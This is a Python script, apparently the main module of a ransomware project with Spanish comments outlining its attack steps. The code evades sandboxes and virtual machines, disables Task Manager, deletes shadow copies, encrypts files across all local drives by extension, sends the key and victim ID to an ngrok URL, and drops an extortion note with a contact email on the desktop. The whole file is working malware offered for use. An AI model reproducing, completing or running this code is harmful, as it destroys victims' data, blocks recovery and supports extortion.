from CryptoManager import CryptoManager
from VirtualEnvironmentDetector import VirtualEnvironmentDetector
import os
import sys
import winshell
import uuid

# Secuencia de acciones del Ransomware
# Paso 1 - En que sistema operativo o entorno se esta ejecutando el malware
# Paso 2 - Averiguar que sistemas de almacenamiento hay disponibles
# Paso 3 - Vamos a elevar privilegios, y daremos al programa los permisos de 'Full Control'
# Paso 4 - Necesitamos eliminar las copias de seguridad
# Paso 5 - Impedir que el sistema operativo reinicie en modo seguro
# Paso 6 - Borraremos los catalogos de las copias de seguridad
# Paso 7 - Miraremos de matar los procesos con bases de datos para garantizar el cifrado de estas
# Paso 8 - Dada la lista de dispositivos locales vamos a ir cifrando aquello que nos interese uno a uno (podemos mantener un set de extensiones o un set de carpetas de especial interes)
# Paso 9 - Una vez hemos encriptado todo debemos disponer la nota de rescate garantizando que se pueda realizar el pago

# Algunas preguntas
# a) Debemos garantizar la persistencia del malware en el dispositivo? => Por lo menos la herramienta para garantizar el pago y la desencriptacion de los datos

if __name__ == '__main__':
    print("Executing encryption protocol")

    # Algunas comprobaciones antes de iniciar el protocolo
    ved = VirtualEnvironmentDetector(dodelay=False)
    
    if not ved.is_windows():
        print('Nothing to do here...')
        sys.exit()

    if ved.neo_takes_blue_pill(tolerance=10):
        print('Exiting the matrix...')
        sys.exit()

    if ved.delay_anti_cuckoo(0):
        print("We are being analyzed...")
        sys.exit()

    cm = CryptoManager(action='encrypt')

    id = uuid.uuid1() # uuid1() is defined in UUID library and helps to generate the random id using MAC address and time component.

    try:
        cm.disable_task_manager()
        cm.delete_shadowcopies()
        print("Task manager disbled and shadow copies eliminated")
    except:
        print("Disable task scheduler and delete shadow copies operations failed")

    local_drives = cm.get_local_drives()

    cm.search_and_split(local_drives)
    
    for ld in local_drives:
        for root, dirs, files in os.walk(ld):
            [dirs.remove(d) for d in list(dirs) if d in cm.PROTECTED_DIRS]
            for fn in files:
                full_path = root + os.sep + fn
                ext=cm.get_file_extension(full_path)
                if ext in cm.TARGET_EXT and ext not in cm.EXCLUDED_EXT:
                    cm.symmetric_encrypt_or_decrypt(full_path)
                    print(full_path + ' -> [encrypted]')
    
    cm.send_post_request(url='http://81fa332e8256.ngrok.io', id=str(id), key=cm.key)

    msg = 'ATTENTION! ALL YOUR DATA ARE PROTECTED WITH AES ALGORITHM\nYour security system was vulnerable, so all of your files are encrypted.\nIf you want to restore them, contact us by email: restoreyourfiles.gengar@gmail.com, indicating {} as email subject.\n\nBE CAREFUL AND DO NOT DAMAGE YOUR DATA:\nDo not rename encrypted files.\nDo not try to decrypt your data using third party software, it may cause permanent data loss.\nDo not trust anyone! Only we have keys to your files! Without this keys restore your data is impossible\n\nWE GUARANTEE A FREE DECODE AS A PROOF OF OUR POSSIBILITIES:\nYou can send us 2 files for free decryption.\nSize of file must be less than 1 Mb (non archived). We don`t decrypt for test DATABASE, XLS and other important files.\n\nDO NOT ATTEMPT TO DECODE YOUR DATA YOURSELF, YOU ONLY DAMAGE THEM AND THEN YOU LOSE THEM FOREVER\nAFTER DECRYPTION YOUR SYSTEM WILL RETURN TO A FULLY NORMALLY AND OPERATIONAL CONDITION!'.format(id)
    desktop_path = winshell.desktop()

    # Copy Ransom Note
    with open(os.path.join(desktop_path, 'info.txt'), 'w') as ransom_note:
        ransom_note.write(msg)
    
    print('All data was successfully encrypted')

    


    

